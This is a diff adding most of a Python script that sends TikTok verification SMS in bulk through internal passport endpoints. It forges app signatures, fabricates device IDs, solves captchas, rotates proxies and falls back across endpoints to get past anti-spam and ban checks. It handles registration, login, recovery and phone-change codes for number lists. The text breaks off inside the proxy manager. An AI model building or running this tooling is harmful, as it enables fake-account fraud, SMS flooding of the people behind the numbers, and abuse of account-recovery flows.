@@ -1,0 +1,4869 @@
+"""
+TikTok SMS Module v12.0
+
+HTTP module for initiating SMS delivery via TikTok's internal API.
+Supports CSV and Number API input, device pooling, captcha solving,
+proxy rotation, rate limiting, endpoint fallback, and graceful shutdown.
+
+Supports events: register (type=6), login (type=1),
+recovery (type=5/9), change_phone (type=21/27).
+
+Five endpoint tiers with automatic fallback:
+  Tier 1: /aweme/v1/passport/send_sms_code/  (best, 2025-2026)
+  Tier 2: /aweme/v1/passport/send_phone_sms/  (good alternative)
+  Tier 3: /passport/mobile/send_code/  (recovery/change)
+  Tier 4: /aweme/v1/passport/send_code/  (legacy regional)
+  Tier 5: /passport/send_sms/  (nearly deprecated)
+
+Uses SignerPy for authentication signatures and encryption.
+Install: pip install SignerPy
+
+Usage:
+    python tiktok_sms.py -i numbers.csv --threads 5 -p "host:port:user:pass"
+    python tiktok_sms.py -i numbers.csv --event recovery --threads 10
+    python tiktok_sms.py --api --event recovery --claim-count 10 --threads 5
+    python tiktok_sms.py --prewarm --pool-count 20
+
+Required: config.json or environment variables for API keys.
+"""
+
+import asyncio
+import aiohttp
+import atexit
+import hashlib
+import json
+import random
+import time
+import base64
+import logging
+import csv
+import argparse
+import sys
+import os
+import signal
+from datetime import datetime, timedelta
+from concurrent.futures import ThreadPoolExecutor
+from urllib.parse import urlencode, quote
+from dataclasses import dataclass, replace, fields, field
+from typing import (
+    Optional, List, Any, Dict, Tuple,
+)
+
+from SignerPy import sign as signerpy_sign
+from SignerPy import get as signerpy_get
+from SignerPy.encryption import enc as signerpy_enc
+
+# Optional: try importing ttencrypt for
+# device_register payload encryption
+try:
+    from SignerPy.ttencrypt import encrypt as signerpy_ttencrypt
+    HAS_TTENCRYPT = True
+except ImportError:
+    HAS_TTENCRYPT = False
+
+# Optional: try importing edata for decryption
+try:
+    from SignerPy.edata import decrypt as signerpy_edata_decrypt
+    HAS_EDATA_DECRYPT = True
+except ImportError:
+    HAS_EDATA_DECRYPT = False
+
+if sys.platform == 'win32':
+    asyncio.set_event_loop_policy(
+        asyncio.WindowsSelectorEventLoopPolicy())
+
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s [%(levelname)s] %(message)s')
+log = logging.getLogger('tiktok_sms')
+
+
+# ============================================
+#  CONSTANTS
+# ============================================
+
+TT_CAPTCHA_REQUIRED = 1107
+TT_DEVICE_BAN = 1109
+TT_RATE_LIMIT_CODES = (1105, 2, 3)
+TT_MSTOKEN_ERRORS = (1003, 1004)
+TT_ANTI_SPAM_CODES = (1105, 1109)
+
+ERR_HLR_FAILED = -1
+ERR_DEVICE_SETUP = -2
+ERR_MAX_RETRIES = -3
+ERR_CAPTCHA_LOOP = -4
+ERR_SHUTDOWN = -5
+ERR_MSTOKEN = -6
+ERR_PROXY_EXHAUSTED = -7
+ERR_CONFIG = -8
+ERR_SIGNER = -9
+ERR_ALL_ENDPOINTS_FAILED = -10
+ERR_CRASH = -99
+
+RETRYABLE_HTTP_CODES = (429, 500, 502, 503, 504)
+HTTP_TOO_MANY_REQUESTS = 429
+
+MAX_CAPTCHA_ATTEMPTS = 2
+MAX_CAPTCHA_ROTATIONS_NO_KEY = 3
+MAX_EMPTY_CLAIMS = 3
+MAX_PROXY_CONSECUTIVE_FAILS = 3
+PROXY_BLACKLIST_BASE_SECONDS = 30
+PROXY_BLACKLIST_CAP_SECONDS = 300
+
+APP_AID = '1233'
+APP_AID_ALT = '1988'
+APP_PACKAGE = 'com.zhiliaoapp.musically'
+APP_DISPLAY_NAME = 'TikTok'
+APP_CHANNEL = 'googleplay'
+APP_SDK_VERSION = '3.0.0'
+
+DEVICE_ID_MIN = 7_000_000_000_000_000_000
+DEVICE_ID_MAX = 7_999_999_999_999_999_999
+DEVICE_ROM_BUILD = 'TP1A.220624.014'
+DEVICE_CPU_ABI = 'arm64-v8a'
+
+MS_TOKEN_TTL_SECONDS = 270
+MS_TOKEN_MAX_USES = 35
+MS_TOKEN_COOKIE_NAME = 'msToken'
+MS_TOKEN_HEADER = 'x-ms-token'
+
+DEVICE_MAX_USES_PER_SESSION = 45
+RECOVERY_MAX_USES_PER_SESSION = 80
+
+CAPTCHA_TIMEOUTS: Dict[str, int] = {
+    '3d': 45, 'shapes': 45,
+    'slide': 20, 'puzzle': 20,
+    'rotate': 25, 'icon': 30,
+}
+CAPTCHA_TIMEOUT_DEFAULT = 30
+
+RATE_LIMIT_BACKOFF_FACTOR = 0.7
+RATE_LIMIT_MIN_RPS = 1.0
+RATE_LIMIT_RECOVERY_SECONDS = 30.0
+RATE_LIMIT_RECOVERY_FACTOR = 1.1
+
+TASK_BATCH_SIZE = 50
+
+FSYNC_INTERVAL = 10
+
+DEVICE_POOL_REQUIRED_KEYS = frozenset({
+    'device_id', 'install_id', 'registered',
+    'version_name', 'device_type', 'region',
+})
+
+URL_DEVICE_REGISTER = (
+    'https://log-boot.tiktokv.com'
+    '/service/2/device_register/')
+URL_CAPTCHA_GET = (
+    'https://verify.tiktok.com/captcha/get')
+URL_CAPTCHA_VERIFY = (
+    'https://verify.tiktok.com/captcha/verify')
+
+VERSION_STALENESS_DAYS = 90
+
+HLR_FIELD_COUNTRY_CODE = 'country_code'
+HLR_FIELD_COUNTRY_PREFIX = 'country_prefix'
+HLR_FIELD_NATIONAL_NUMBER = 'national_number'
+HLR_FIELD_COUNTRY_NAME = 'country_name'
+HLR_FIELD_CARRIER = 'carrier'
+
+MASK_PREFIX_LEN = 2
+MASK_SUFFIX_LEN = 2
+MASK_SHORT_THRESHOLD = 6
+
+# SignerPy supported gorgon versions
+SIGNERPY_GORGON_VERSIONS = (8404, 8402, 4404)
+SIGNERPY_DEFAULT_GORGON = 8404
+
+
+# ============================================
+#  ENDPOINT REGISTRY (5 TIERS)
+# ============================================
+
+@dataclass(frozen=True)
+class SMSEndpoint:
+    """Describes a single TikTok SMS endpoint."""
+    tier: int
+    path: str
+    stability: str
+    body_style: str  # 'mobile' | 'phone_number'
+    preferred_aid: str
+    supported_types: Tuple[int, ...]
+    notes: str = ''
+
+    @property
+    def is_deprecated(self) -> bool:
+        return self.stability in (
+            'deprecated', 'nearly_deprecated')
+
+
+ENDPOINT_TIER_1 = SMSEndpoint(
+    tier=1,
+    path='/aweme/v1/passport/send_sms_code/',
+    stability='excellent',
+    body_style='phone_number',
+    preferred_aid=APP_AID_ALT,
+    supported_types=(6, 1, 9),
+    notes=(
+        'Top choice 2025-2026.'
+        ' Best for new numbers.'),
+)
+
+ENDPOINT_TIER_2 = SMSEndpoint(
+    tier=2,
+    path='/aweme/v1/passport/send_phone_sms/',
+    stability='good',
+    body_style='mobile',
+    preferred_aid=APP_AID,
+    supported_types=(27, 1, 6),
+    notes=(
+        'Good alternative.'
+        ' Bypasses some blocks.'),
+)
+
+ENDPOINT_TIER_3 = SMSEndpoint(
+    tier=3,
+    path='/passport/mobile/send_code/',
+    stability='stable',
+    body_style='mobile',
+    preferred_aid=APP_AID,
+    supported_types=(5, 21, 1),
+    notes=(
+        'Stable for recovery'
+        ' and change_phone.'),
+)
+
+ENDPOINT_TIER_4 = SMSEndpoint(
+    tier=4,
+    path='/aweme/v1/passport/send_code/',
+    stability='legacy',
+    body_style='mobile',
+    preferred_aid=APP_AID,
+    supported_types=(5, 21),
+    notes=(
+        'Legacy. Works in some regions.'),
+)
+
+ENDPOINT_TIER_5 = SMSEndpoint(
+    tier=5,
+    path='/passport/send_sms/',
+    stability='nearly_deprecated',
+    body_style='phone_number',
+    preferred_aid=APP_AID,
+    supported_types=(1, 6),
+    notes=(
+        'Nearly deprecated.'
+        ' Occasional responses.'),
+)
+
+ALL_ENDPOINTS: Tuple[SMSEndpoint, ...] = (
+    ENDPOINT_TIER_1,
+    ENDPOINT_TIER_2,
+    ENDPOINT_TIER_3,
+    ENDPOINT_TIER_4,
+    ENDPOINT_TIER_5,
+)
+
+_ENDPOINTS_BY_TIER: Dict[int, SMSEndpoint] = {
+    ep.tier: ep for ep in ALL_ENDPOINTS
+}
+
+
+# ============================================
+#  EVENT TYPES
+# ============================================
+
+VALID_EVENTS = (
+    'register', 'login',
+    'recovery', 'change_phone')
+
+LIGHTWEIGHT_EVENTS = frozenset({
+    'recovery', 'change_phone',
+})
+
+EVENT_EXTRA_PARAMS: Dict[
+    str, Dict[str, Any]] = {
+    'register': {
+        'account_sdk_source': 'app',
+        'mix_mode': 1,
+        'multi_login': 1,
+    },
+    'login': {
+        'account_sdk_source': 'app',
+        'mix_mode': 1,
+        'multi_login': 1,
+    },
+    'recovery': {
+        'account_sdk_source': 'app',
+        'mix_mode': 1,
+        'multi_login': 1,
+    },
+    'change_phone': {
+        'account_sdk_source': 'app',
+        'mix_mode': 1,
+    },
+}
+
+
+# ============================================
+#  EVENT → ENDPOINT CHAIN + TYPE MAPPING
+# ============================================
+
+@dataclass(frozen=True)
+class EventEndpointConfig:
+    """Maps an event to its SMS type and
+    ordered endpoint fallback chain."""
+    sms_type: int
+    fallback_types: Tuple[int, ...]
+    endpoint_chain: Tuple[int, ...]
+    notes: str = ''
+
+    @property
+    def primary_tier(self) -> int:
+        return self.endpoint_chain[0]
+
+
+EVENT_ENDPOINT_MAP: Dict[
+    str, EventEndpointConfig] = {
+    'register': EventEndpointConfig(
+        sms_type=6,
+        fallback_types=(6, 1),
+        endpoint_chain=(1, 2, 3),
+        notes=(
+            'type=6 registration.'
+            ' Tier 1 best, fallback 2→3.'),
+    ),
+    'login': EventEndpointConfig(
+        sms_type=1,
+        fallback_types=(1,),
+        endpoint_chain=(1, 3, 2),
+        notes=(
+            'type=1 login. Less checks'
+            ' than registration.'),
+    ),
+    'recovery': EventEndpointConfig(
+        sms_type=9,
+        fallback_types=(9, 5),
+        endpoint_chain=(1, 3, 4),
+        notes=(
+            'type=9 reset (tier 1),'
+            ' fallback type=5 on tier 3/4.'
+            ' Lightweight mode.'),
+    ),
+    'change_phone': EventEndpointConfig(
+        sms_type=27,
+        fallback_types=(27, 21),
+        endpoint_chain=(2, 3, 4),
+        notes=(
+            'type=27 on tier 2,'
+            ' fallback type=21 on tier 3/4.'),
+    ),
+}
+
+
+def get_event_config(
+        event: str) -> EventEndpointConfig:
+    if event not in EVENT_ENDPOINT_MAP:
+        raise ConfigError(
+            'Unknown event: ' + event)
+    return EVENT_ENDPOINT_MAP[event]
+
+
+def resolve_sms_type_for_endpoint(
+        event_cfg: EventEndpointConfig,
+        endpoint: SMSEndpoint,
+) -> int:
+    """Pick the best sms_type for this endpoint.
+
+    Uses the event's primary type if the
+    endpoint supports it; otherwise tries
+    fallback types in order. Returns the
+    primary type as last resort.
+    """
+    if event_cfg.sms_type in (
+            endpoint.supported_types):
+        return event_cfg.sms_type
+    for ft in event_cfg.fallback_types:
+        if ft in endpoint.supported_types:
+            return ft
+    return event_cfg.sms_type
+
+
+def build_endpoint_chain(
+        event_cfg: EventEndpointConfig,
+        include_deprecated: bool = False,
+) -> List[Tuple[SMSEndpoint, int]]:
+    """Build ordered list of (endpoint, sms_type)
+    pairs for fallback iteration."""
+    chain: List[Tuple[SMSEndpoint, int]] = []
+    seen_tiers: set = set()
+
+    for tier in event_cfg.endpoint_chain:
+        ep = _ENDPOINTS_BY_TIER.get(tier)
+        if not ep:
+            continue
+        if (ep.is_deprecated
+                and not include_deprecated):
+            continue
+        sms_type = resolve_sms_type_for_endpoint(
+            event_cfg, ep)
+        chain.append((ep, sms_type))
+        seen_tiers.add(tier)
+
+    if include_deprecated:
+        for ep in ALL_ENDPOINTS:
+            if ep.tier in seen_tiers:
+                continue
+            sms_type = (
+                resolve_sms_type_for_endpoint(
+                    event_cfg, ep))
+            chain.append((ep, sms_type))
+
+    return chain
+
+
+def build_body_for_endpoint(
+        endpoint: SMSEndpoint,
+        sms_type: int,
+        prefix: str,
+        national: str,
+        extra_params: Dict[str, Any],
+) -> str:
+    """Build URL-encoded body based on
+    endpoint's body_style."""
+    body_params: Dict[str, Any] = {}
+
+    if endpoint.body_style == 'phone_number':
+        full_number = prefix + national
+        body_params['phone_number'] = (
+            full_number)
+        body_params['area'] = prefix
+        body_params['country_code'] = prefix
+        body_params['type'] = sms_type
+    else:
+        body_params['type'] = sms_type
+        body_params['mobile_prefix'] = prefix
+        body_params['mobile'] = national
+
+    if endpoint.preferred_aid != APP_AID:
+        body_params['aid'] = (
+            endpoint.preferred_aid)
+
+    body_params.update(extra_params)
+    return urlencode(body_params)
+
+
+# ============================================
+#  APK VERSION REGISTRY
+# ============================================
+
+@dataclass(frozen=True)
+class APKVersion:
+    version_name: str
+    version_code: str
+    manifest_version_code: str
+    tt_ok_version: str
+    gorgon_prefix: str
+    gorgon_version: int
+    passport_sdk_version: str
+    sig_hash: str
+    stability: str
+    release_date: str = ''
+    min_sdk: int = 23
+    target_sdk: int = 35
+
+    @property
+    def manifest_int(self) -> int:
+        try:
+            return int(
+                self.manifest_version_code)
+        except (ValueError, TypeError):
+            return 2024309020
+
+    @property
+    def version_code_int(self) -> int:
+        try:
+            return int(self.version_code)
+        except (ValueError, TypeError):
+            return 430902
+
+    def is_outdated(
+            self, days: int = 90) -> bool:
+        if not self.release_date:
+            return False
+        try:
+            rd = datetime.strptime(
+                self.release_date, '%Y-%m-%d')
+            return (
+                datetime.now() - rd
+                > timedelta(days=days))
+        except ValueError:
+            return False
+
+    def is_device_compatible(
+            self, os_api: int) -> bool:
+        return self.min_sdk <= os_api <= self.target_sdk
+
+
+_DEFAULT_SIG_HASH = (
+    '194326e82c84a639a52e5c023116f12a')
+
+APK_VERSIONS: Tuple[APKVersion, ...] = (
+    APKVersion(
+        version_name='43.9.2',
+        version_code='430902',
+        manifest_version_code='2024309020',
+        tt_ok_version='3.15.2-tiktok',
+        gorgon_prefix='8404',
+        gorgon_version=8404,
+        passport_sdk_version='26',
+        sig_hash=_DEFAULT_SIG_HASH,
+        stability='stable',
+        release_date='2025-02-14',
+        min_sdk=23,
+        target_sdk=35,
+    ),
+    APKVersion(
+        version_name='37.0.4',
+        version_code='370004',
+        manifest_version_code='2023700040',
+        tt_ok_version='3.15.1-tiktok',
+        gorgon_prefix='8404',
+        gorgon_version=8404,
+        passport_sdk_version='25',
+        sig_hash=_DEFAULT_SIG_HASH,
+        stability='stable',
+        release_date='2024-01-15',
+        min_sdk=23,
+        target_sdk=34,
+    ),
+    APKVersion(
+        version_name='37.0.3',
+        version_code='370003',
+        manifest_version_code='2023700030',
+        tt_ok_version='3.15.1-tiktok',
+        gorgon_prefix='8404',
+        gorgon_version=8404,
+        passport_sdk_version='25',
+        sig_hash=_DEFAULT_SIG_HASH,
+        stability='deprecated',
+        release_date='2024-01-10',
+        min_sdk=23,
+        target_sdk=34,
+    ),
+    APKVersion(
+        version_name='37.0.2',
+        version_code='370002',
+        manifest_version_code='2023700020',
+        tt_ok_version='3.15.1-tiktok',
+        gorgon_prefix='8402',
+        gorgon_version=8402,
+        passport_sdk_version='25',
+        sig_hash=_DEFAULT_SIG_HASH,
+        stability='deprecated',
+        release_date='2024-01-05',
+        min_sdk=23,
+        target_sdk=34,
+    ),
+)
+
+_APK_VERSION_MAP: Dict[str, APKVersion] = {
+    v.version_name: v for v in APK_VERSIONS
+}
+
+DEFAULT_APK_VERSION = APK_VERSIONS[0]
+
+
+def get_apk_version(
+        name: str) -> APKVersion:
+    return _APK_VERSION_MAP.get(
+        name, DEFAULT_APK_VERSION)
+
+
+# ============================================
+#  SIGNERPY WRAPPERS
+# ============================================
+
+def signer_sign(
+        params: str,
+        payload: Any = None,
+        gorgon_version: int = SIGNERPY_DEFAULT_GORGON,
+) -> Dict[str, str]:
+    """Generate TikTok authentication headers
+    using SignerPy.sign().
+
+    Args:
+        params: URL-encoded query string
+        payload: POST body (str or None)
+        gorgon_version: Gorgon algorithm version
+            (8404, 8402, or 4404)
+
+    Returns:
+        Dict with x-gorgon, x-argus, x-ladon,
+        x-khronos, x-ss-req-ticket, x-ss-stub,
+        and other headers.
+
+    Raises:
+        SignerError on any failure.
+    """
+    if gorgon_version not in SIGNERPY_GORGON_VERSIONS:
+        log.warning(
+            'Gorgon version %d not in supported'
+            ' list %s, using %d',
+            gorgon_version,
+            SIGNERPY_GORGON_VERSIONS,
+            SIGNERPY_DEFAULT_GORGON)
+        gorgon_version = SIGNERPY_DEFAULT_GORGON
+
+    try:
+        result = signerpy_sign(
+            params=params,
+            payload=payload,
+            version=gorgon_version,
+        )
+        if not isinstance(result, dict):
+            raise SignerError(
+                'sign() returned '
+                + type(result).__name__
+                + ', expected dict')
+        if not result:
+            raise SignerError(
+                'sign() returned empty dict')
+        return result
+    except SignerError:
+        raise
+    except Exception as exc:
+        raise SignerError(
+            'sign() crashed: '
+            + type(exc).__name__
+            + ': ' + str(exc))
+
+
+def signer_get_params(
+        params: Dict[str, str],
+) -> Dict[str, str]:
+    """Update device fingerprint parameters
+    using SignerPy.get().
+
+    Adds/updates iid, device_id, cdid, openudid
+    and other fingerprint fields.
+
+    Args:
+        params: Current query parameters dict
+
+    Returns:
+        Dict with updated/added parameters.
+
+    Raises:
+        SignerError on failure.
+    """
+    try:
+        result = signerpy_get(params=params)
+        if not isinstance(result, dict):
+            raise SignerError(
+                'get() returned '
+                + type(result).__name__
+                + ', expected dict')
+        return result
+    except SignerError:
+        raise
+    except Exception as exc:
+        raise SignerError(
+            'get() crashed: '
+            + type(exc).__name__
+            + ': ' + str(exc))
+
+
+def signer_encrypt(payload: Any) -> bytes:
+    """Encrypt payload for device_register
+    using SignerPy.encryption.enc().
+
+    Falls back to ttencrypt if available
+    and enc() fails.
+
+    Args:
+        payload: Dict or JSON-serializable data
+
+    Returns:
+        Encrypted bytes
+
+    Raises:
+        SignerError if all methods fail.
+    """
+    # Try enc() first (primary encryption)
+    try:
+        result = signerpy_enc(payload)
+        if isinstance(result, bytes) and result:
+            return result
+        if isinstance(result, str) and result:
+            return result.encode('utf-8')
+        # enc() returned empty/None, try ttencrypt
+    except Exception as exc_enc:
+        log.debug(
+            'enc() failed: %s, trying ttencrypt',
+            exc_enc)
+
+    # Fallback to ttencrypt if available
+    if HAS_TTENCRYPT:
+        try:
+            if isinstance(payload, dict):
+                payload_bytes = json.dumps(
+                    payload).encode('utf-8')
+            elif isinstance(payload, str):
+                payload_bytes = payload.encode(
+                    'utf-8')
+            elif isinstance(payload, bytes):
+                payload_bytes = payload
+            else:
+                payload_bytes = json.dumps(
+                    payload).encode('utf-8')
+            result = signerpy_ttencrypt(
+                payload_bytes)
+            if isinstance(result, bytes) and result:
+                return result
+            if isinstance(result, str) and result:
+                return result.encode('utf-8')
+            raise SignerError(
+                'ttencrypt() returned empty')
+        except SignerError:
+            raise
+        except Exception as exc:
+            raise SignerError(
+                'ttencrypt() crashed: '
+                + type(exc).__name__
+                + ': ' + str(exc))
+
+    raise SignerError(
+        'All encryption methods failed.'
+        ' enc() and ttencrypt both unavailable'
+        ' or returned empty.')
+
+
+def signer_decrypt(data: bytes) -> str:
+    """Decrypt TikTok response data using
+    SignerPy.edata.decrypt() if available.
+
+    Args:
+        data: Encrypted response bytes
+
+    Returns:
+        Decrypted string
+
+    Raises:
+        SignerError if decryption fails or
+        module not available.
+    """
+    if not HAS_EDATA_DECRYPT:
+        raise SignerError(
+            'SignerPy.edata.decrypt not available.'
+            ' Install newer SignerPy or handle'
+            ' plaintext responses.')
+    try:
+        result = signerpy_edata_decrypt(data)
+        if isinstance(result, str):
+            return result
+        if isinstance(result, bytes):
+            return result.decode('utf-8')
+        raise SignerError(
+            'decrypt() returned '
+            + type(result).__name__)
+    except SignerError:
+        raise
+    except Exception as exc:
+        raise SignerError(
+            'decrypt() crashed: '
+            + type(exc).__name__
+            + ': ' + str(exc))
+
+
+def signer_headers(
+        params: str,
+        ver: APKVersion,
+        device_id: str,
+        data: Any = None,
+        cookie: Optional[str] = None,
+) -> Dict[str, str]:
+    """Generate full authentication headers
+    for a TikTok API request using SignerPy.
+
+    This is the main entry point that combines
+    sign() output with any cookie-based headers.
+
+    Args:
+        params: URL-encoded query string
+        ver: APK version configuration
+        device_id: Device ID string
+        data: POST body (str, bytes, or None)
+        cookie: Cookie string (e.g. 'msToken=...')
+
+    Returns:
+        Dict with all required auth headers.
+
+    Raises:
+        SignerError on failure.
+    """
+    # Prepare payload for signing
+    sign_payload = None
+    if data is not None:
+        if isinstance(data, bytes):
+            sign_payload = data.decode(
+                'utf-8', errors='replace')
+        elif isinstance(data, str):
+            sign_payload = data
+        else:
+            sign_payload = str(data)
+
+    try:
+        auth = signer_sign(
+            params=params,
+            payload=sign_payload,
+            gorgon_version=ver.gorgon_version,
+        )
+    except SignerError:
+        raise
+    except Exception as exc:
+        raise SignerError(
+            'signer_headers() failed: '
+            + type(exc).__name__
+            + ': ' + str(exc))
+
+    # Ensure x-khronos is present
+    if 'x-khronos' not in auth:
+        auth['x-khronos'] = str(
+            int(time.time()))
+
+    # Ensure x-ss-req-ticket is present
+    if 'x-ss-req-ticket' not in auth:
+        auth['x-ss-req-ticket'] = str(
+            int(time.time() * 1000))
+
+    return auth
+
+
+def validate_gorgon_prefix(
+        auth: Dict[str, str],
+        ver: APKVersion,
+        debug: bool = False,
+        tag: str = '') -> None:
+    """Validate that the generated x-gorgon
+    header prefix matches expected version."""
+    gorgon = auth.get('x-gorgon', '')
+    if not gorgon:
+        return
+    expected_prefix = str(ver.gorgon_version)[:4]
+    if gorgon.startswith(expected_prefix):
+        return
+    level = log.error if debug else log.warning
+    level(
+        '%sX-Gorgon prefix mismatch:'
+        ' expected %s, got %s.'
+        ' SignerPy may not match APK %s.',
+        tag, expected_prefix,
+        gorgon[:4], ver.version_name)
+
+
+# ============================================
+#  SIGNER AUTO-DETECT
+# ============================================
+
+def detect_signer_version() -> Optional[APKVersion]:
+    """Probe SignerPy to find which gorgon
+    version it actually supports.
+
+    Generates test signatures for each known APK
+    version and checks x-gorgon prefix match.
+    Returns the best matching APKVersion, or
+    None if signer is broken.
+    """
+    test_params = (
+        'aid=1233&device_id=7123456789012345678')
+
+    # Try non-deprecated versions first
+    for ver in APK_VERSIONS:
+        if ver.stability == 'deprecated':
+            continue
+        try:
+            auth = signer_sign(
+                params=test_params,
+                payload=None,
+                gorgon_version=ver.gorgon_version,
+            )
+            if not isinstance(auth, dict):
+                continue
+            gorgon = auth.get('x-gorgon', '')
+            expected = str(
+                ver.gorgon_version)[:4]
+            if gorgon and gorgon.startswith(
+                    expected):
+                log.info(
+                    'Signer auto-detect: %s'
+                    ' (gorgon=%s)',
+                    ver.version_name,
+                    expected)
+                return ver
+        except Exception:
+            continue
+
+    # Try deprecated versions as fallback
+    for ver in APK_VERSIONS:
+        if ver.stability != 'deprecated':
+            continue
+        try:
+            auth = signer_sign(
+                params=test_params,
+                payload=None,
+                gorgon_version=ver.gorgon_version,
+            )
+            if not isinstance(auth, dict):
+                continue
+            gorgon = auth.get('x-gorgon', '')
+            expected = str(
+                ver.gorgon_version)[:4]
+            if gorgon and gorgon.startswith(
+                    expected):
+                log.warning(
+                    'Signer auto-detect:'
+                    ' %s (deprecated!)'
+                    ' gorgon=%s',
+                    ver.version_name,
+                    expected)
+                return ver
+        except Exception:
+            continue
+
+    # Last resort: try all known gorgon versions
+    for gv in SIGNERPY_GORGON_VERSIONS:
+        try:
+            auth = signer_sign(
+                params=test_params,
+                payload=None,
+                gorgon_version=gv,
+            )
+            if not isinstance(auth, dict):
+                continue
+            gorgon = auth.get('x-gorgon', '')
+            if gorgon:
+                prefix = gorgon[:4]
+                for v in APK_VERSIONS:
+                    gv_prefix = str(
+                        v.gorgon_version)[:4]
+                    if prefix == gv_prefix:
+                        log.warning(
+                            'Signer produces'
+                            ' gorgon %s which'
+                            ' matches %s.',
+                            prefix,
+                            v.version_name)
+                        return v
+                log.error(
+                    'Unknown gorgon prefix: %s'
+                    ' (gorgon_version=%d)',
+                    prefix, gv)
+        except Exception:
+            continue
+
+    return None
+
+
+# ============================================
+#  HLR RESPONSE MODEL
+# ============================================
+
+@dataclass
+class HLRResult:
+    country_code: str = 'US'
+    country_prefix: str = ''
+    national_number: str = ''
+    country_name: str = ''
+    carrier: str = ''
+
+    @classmethod
+    def from_api(
+            cls, info: dict,
+            fallback_number: str = ''
+    ) -> 'HLRResult':
+        return cls(
+            country_code=info.get(
+                HLR_FIELD_COUNTRY_CODE,
+                'US'),
+            country_prefix=strip_plus(
+                info.get(
+                    HLR_FIELD_COUNTRY_PREFIX,
+                    '')),
+            national_number=info.get(
+                HLR_FIELD_NATIONAL_NUMBER,
+                fallback_number),
+            country_name=info.get(
+                HLR_FIELD_COUNTRY_NAME, ''),
+            carrier=info.get(
+                HLR_FIELD_CARRIER, ''),
+        )
+
+
+# ============================================
+#  FILE I/O EXECUTOR
+# ============================================
+
+_io_executor = ThreadPoolExecutor(
+    max_workers=2, thread_name_prefix='file_io')
+
+atexit.register(
+    lambda: _io_executor.shutdown(wait=False))
+
+
+async def run_in_io(func, *args):
+    loop = asyncio.get_running_loop()
+    return await loop.run_in_executor(
+        _io_executor, func, *args)
+
+
+# ============================================
+#  PII MASKING
+# ============================================
+
+def mask_phone(phone: str) -> str:
+    if not phone:
+        return '***'
+    clean = phone.strip()
+    if len(clean) <= MASK_SHORT_THRESHOLD:
+        return (
+            clean[:MASK_PREFIX_LEN] + '***')
+    prefix = clean[:MASK_PREFIX_LEN]
+    suffix = clean[-MASK_SUFFIX_LEN:]
+    mid = (
+        len(clean)
+        - MASK_PREFIX_LEN
+        - MASK_SUFFIX_LEN)
+    return prefix + '*' * mid + suffix
+
+
+# ============================================
+#  EXCEPTIONS
+# ============================================
+
+class AppError(Exception):
+    """Base application error."""
+
+
+class NetworkError(AppError):
+    def __init__(self, msg: str,
+                 retryable: bool = True):
+        super().__init__(msg)
+        self.retryable = retryable
+
+
+class ParseError(AppError):
+    pass
+
+
+class DeviceError(AppError):
+    pass
+
+
+class CaptchaError(AppError):
+    pass
+
+
+class ProxyError(AppError):
+    pass
+
+
+class TokenError(AppError):
+    pass
+
+
+class ShutdownError(AppError):
+    pass
+
+
+class ConfigError(AppError):
+    pass
+
+
+class HLRError(AppError):
+    pass
+
+
+class SignerError(AppError):
+    pass
+
+
+class EndpointExhaustedError(AppError):
+    pass
+
+
+# ============================================
+#  SHUTDOWN
+# ============================================
+
+shutdown_event = asyncio.Event()
+
+
+def _setup_signals():
+    def _handler(sig, _):
+        log.info('Signal %s, shutting down...', sig)
+        shutdown_event.set()
+    for sig in (signal.SIGINT, signal.SIGTERM):
+        try:
+            signal.signal(sig, _handler)
+        except (OSError, ValueError):
+            pass
+
+
+def check_shutdown():
+    if shutdown_event.is_set():
+        raise ShutdownError('Shutdown requested')
+
+
+# ============================================
+#  UTILS
+# ============================================
+
+def strip_plus(phone: str) -> str:
+    if phone.startswith('+'):
+        return phone[1:]
+    return phone
+
+
+def safe_get(data: Any, *keys,
+             default=None) -> Any:
+    current = data
+    for key in keys:
+        if current is None:
+            return default
+        if isinstance(current, dict):
+            current = current.get(key, default)
+        elif (isinstance(current, (list, tuple))
+              and isinstance(key, int)):
+            try:
+                current = current[key]
+            except (IndexError, TypeError):
+                return default
+        else:
+            return default
+    return current
+
+
+def jitter_delay(attempt: int,
+                 base: float = 1.0,
+                 cap: float = 30.0) -> float:
+    return random.uniform(
+        0, min(base * (2 ** attempt), cap))
+
+
+def truncate_header(value: str,
+                    length: int = 40) -> str:
+    if not value:
+        return '<empty>'
+    if len(value) <= length:
+        return value
+    return value[:length] + '...'
+
+
+# ============================================
+#  RATE LIMITER
+# ============================================
+
+class RateLimiter:
+    def __init__(self, rate: float = 10.0,
+                 burst: int = 20):
+        self._rate = rate
+        self._initial_rate = rate
+        self._burst = burst
+        self._tokens = float(burst)
+        self._last_refill = time.monotonic()
+        self._last_slowdown = 0.0
+        self._lock = asyncio.Lock()
+
+    async def acquire(self,
+                      tokens: int = 1) -> None:
+        while True:
+            check_shutdown()
+            async with self._lock:
+                now = time.monotonic()
+                elapsed = now - self._last_refill
+                self._tokens = min(
+                    self._burst,
+                    self._tokens
+                    + elapsed * self._rate)
+                self._last_refill = now
+                if (self._rate
+                        < self._initial_rate
+                        and self._last_slowdown > 0
+                        and (now
+                             - self._last_slowdown)
+                        > RATE_LIMIT_RECOVERY_SECONDS
+                ):
+                    self._rate = min(
+                        self._initial_rate,
+                        self._rate
+                        * RATE_LIMIT_RECOVERY_FACTOR)
+                    log.info(
+                        'Rate recovering -> %.1f',
+                        self._rate)
+                if self._tokens >= tokens:
+                    self._tokens -= tokens
+                    return
+                wait = (
+                    (tokens - self._tokens)
+                    / self._rate)
+            await asyncio.sleep(min(wait, 1.0))
+
+    async def slow_down(self) -> None:
+        async with self._lock:
+            new_rate = max(
+                RATE_LIMIT_MIN_RPS,
+                self._rate
+                * RATE_LIMIT_BACKOFF_FACTOR)
+            if new_rate != self._rate:
+                self._rate = new_rate
+                self._last_slowdown = (
+                    time.monotonic())
+                log.info(
+                    'Rate limiter -> %.1f',
+                    self._rate)
+
+
+# ============================================
+#  PROXY MANAGER
+# ============================================
+
+class ProxyManager:
+
+    @dataclass
+    class _Entry:
+        host: str
+        port: str
+        user: str
+        password: str
+        fail_count: int = 0
+        last_fail: float = 0.0
+        blacklisted_until: float = 0.0
+        total_requests: int = 0
+        total_errors: int = 0
+
+        def is_available(self) -> bool:
+            return (
+                self.blacklisted_until <= 0
+                or time.time()
+                > self.blacklisted_until)
+
+        def record_success(self) -> None:
+            self.total_requests += 1
+            self.fail_count = 0
+
+        def record_failure(self) -> None:
+            self.total_requests += 1
+            self.total_errors += 1
+            self.fail_count += 1
+            self.last_fail = time.time()
+            if (self.fail_count
+                    >= MAX_PROXY_CONSECUTIVE_FAILS):
+                duration = min(
+                    PROXY_BLACKLIST_BASE_SECONDS
+                    * (2 ** (
